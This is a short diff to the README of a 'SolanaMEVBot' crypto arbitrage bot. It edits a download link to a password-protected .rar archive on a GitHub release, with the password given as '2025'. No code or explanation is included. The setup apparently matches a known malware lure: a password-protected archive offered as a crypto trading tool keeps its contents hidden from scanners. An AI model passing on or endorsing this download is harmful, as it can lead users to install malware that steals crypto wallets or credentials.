@@ -1,7 +1,9 @@
 # ⚡ SolanaMEVBot – Automated Solana Arbitrage & Crypto Trading Bot
 
-# [📁Download the latest version](https://github.com/harrymack13/Solana-MEV-Bot/releases/download/release/SolanaMevBot.rar)
-# 🔐PASSWORD: 2025
+# [📁Download the latest version](https://github.com/harrymack13/Solana-MEV-Bot/releases/download/release/SolanaMevBot.rar) 🔐PASSWORD: 2025
+#
+#
+#
 
 ## 🔍 Overview
 
